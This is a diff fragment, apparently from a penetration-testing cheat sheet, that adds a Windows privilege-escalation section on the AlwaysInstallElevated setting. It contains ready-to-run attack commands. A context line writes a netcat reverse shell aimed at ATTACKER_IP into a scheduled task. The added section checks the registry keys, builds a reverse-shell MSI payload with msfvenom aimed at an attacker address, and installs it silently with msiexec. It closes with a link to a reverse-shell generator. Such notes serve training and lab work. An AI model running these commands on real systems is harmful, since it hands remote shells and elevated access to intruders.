@@ -110,7 +110,18 @@ echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat <== ad
 schtasks /run /tn vulntask <== run the task to get reverse shell with executer's account
 ```
 
-* ### 
+* ### AlwaysInstalledElevated
+```
+Check if both registeries are set
+C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+Use msfvenom to create a malicious payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.204.124 LPORT=LOCAL_PORT -f msi -o malicious.msi
+	
+Then run it after setting the multi handler on metasploit
+msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+```
 # Reverse Shell
 ***
 * ### https://www.revshells.com/
